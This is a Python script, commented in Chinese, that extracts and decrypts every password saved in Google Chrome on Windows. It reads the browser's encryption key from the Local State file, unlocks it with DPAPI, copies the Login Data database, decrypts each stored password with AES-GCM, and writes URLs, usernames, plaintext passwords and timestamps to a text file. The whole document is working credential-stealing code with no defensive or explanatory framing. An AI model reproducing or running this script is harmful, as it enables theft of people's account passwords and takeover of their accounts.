import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta


def get_chrome_datetime(chromedate):
    """从chrome格式的datetime返回一个`datetime.datetime`对象
因为'chromedate'的格式是1601年1月以来的微秒数"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            #不受支持
            return ""


def main():
    date = ''
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # 遍历所有行
    out_file = open('date.txt','w+')
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]

        if username or password:
            date = date+f"初始URL: {origin_url}\n活动URL: {action_url}\n账号: {username}\n密码: {password}\n"
        else:
            continue
        if date_created != 86400000000 and date_created:
            date = date+f"初始时间: {str(get_chrome_datetime(date_created))}\n"
        if date_last_used != 86400000000 and date_last_used:
            date = date+f"最后时间: {str(get_chrome_datetime(date_last_used))}\n"
        date = date+'='*20
        out_file.write(date)

    cursor.close()
    db.close()
    out_file.close()
    try:
        #删除复制的db文件
        os.remove(filename)
    except:
        pass
    input()


if __name__ == "__main__":
    main()
